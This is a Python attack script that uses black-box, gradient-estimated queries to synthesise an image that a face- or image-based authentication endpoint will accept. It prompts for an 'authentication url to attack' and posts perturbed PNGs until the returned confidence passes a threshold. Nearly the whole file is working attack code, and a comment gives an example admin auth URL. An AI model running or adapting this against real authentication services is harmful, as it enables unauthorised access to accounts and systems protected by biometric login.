import requests
import torch
import torch.nn.functional as F
import torchvision.transforms as T
from   torchvision.utils import save_image
import torchvision.io as tvio
import numpy as np
import io
from PIL import Image

# http://localhost:8000/api/v1/auth/Admin

def run_attack(args):

    if not args.output:
        args.output = "tensor.png"

    SERVER_URL = input("Authentication url to attack: ")

    EMBED_SIZE  = 512   # Embedding dimensions
    SEND_SIZE   = 160   # Target send dimensions
    SIGMA       = 0.18  # Explore rate
    LR          = 0.42  # Learning rate
    DECAY       = 0.95  # Learning & explore decay (breaking)
    UNSTUCK     = 3     # If learning starts to plateau (No. of times)
    FD_SAMPLES  = 25    # Sample average
    STEPS       = 1000  # How many steps to train the inversion model
    EARLY_STOP  = 0.95  # Early stop %

    def tensor_to_png_bytes(img_tensor):
        img = img_tensor.squeeze().detach()
        img = (img * 255).clamp(0,255).to(torch.uint8)

        # encode_png still requires CPU, but skips PIL overhead
        img = img.cpu()
        return tvio.encode_png(img).numpy().tobytes()

    def query_server(img_tensor):
        resize_to_model = T.Resize((160, 160))
        img_tensor = resize_to_model(img_tensor.clamp(0, 1))
        img_bytes = tensor_to_png_bytes(img_tensor)
        files = {"file": ("image.png", img_bytes, "image/png")}
        response = requests.post(SERVER_URL, files=files)
        return response.json()["confidence"]

    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    generated = torch.rand(1, 3, EMBED_SIZE, EMBED_SIZE, device=device)
    current_score = 0.0
    high_score = 0.0
    stuck = 0
    lr = LR
    sigma = SIGMA
    min_lr = LR / 10
    min_sigma = SIGMA / 10

    print("\033[?25lLoading...\r", end="")

    for step in range(STEPS):
        grad_estimate = torch.zeros_like(generated)
        noise_list = []
        score_list = []

        for _ in range(FD_SAMPLES):
            u = torch.randn_like(generated)
            noise_list.append(u)

            perturbed = (generated + sigma * u).clamp(0,1)
            score = query_server(perturbed)

            score_list.append(score)

        score_mean = np.mean(score_list)

        # variance reduction (very important)
        for u, score in zip(noise_list, score_list):
            grad_estimate += (score - score_mean) * u

        grad_estimate /= (FD_SAMPLES * sigma)

        generated = (generated + lr * grad_estimate).clamp(0,1)

        new_score = query_server(generated)
        if new_score >= high_score:
            high_score = new_score
            stuck = 0
        else:
            stuck += 1

        # Update learning

        if stuck > UNSTUCK:
            print("")
            lr    = max(min_lr,    lr    * DECAY)
            sigma = max(min_sigma, sigma * DECAY)
            high_score = 0.0

        print(f"\033[n [{step + 1}/{STEPS}]: Accuracy {high_score * 100:.4f}% ({lr:.6f}α/{sigma:.6f}σ) stuck {stuck}.\r", end="")

        current_score = score
        # ---- EARLY STOP ----
        if current_score >= EARLY_STOP:
            print(f"\nEarly stopping at step {step} — reached {current_score:.4f} confidence.")
            break

    print("\033[?25h")

    final_high = generated
    save_image(final_high, args.output)

    print("Finished.")
